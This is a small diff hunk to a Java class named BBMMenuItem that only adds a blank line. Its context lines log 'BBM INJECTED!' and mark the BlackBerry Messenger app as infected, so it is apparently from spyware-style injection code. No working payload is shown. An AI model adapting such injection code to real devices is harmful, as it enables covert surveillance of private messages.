@@ -131,6 +131,7 @@ public class BBMMenuItem extends ApplicationMenuItem {
                 debug.info("BBM INJECTED!");
                 debug.ledFlash(Debug.COLOR_GREEN);
                 //#endif
+                
                 AppInjectorBBM.getInstance().setInfected();
 
             } else {
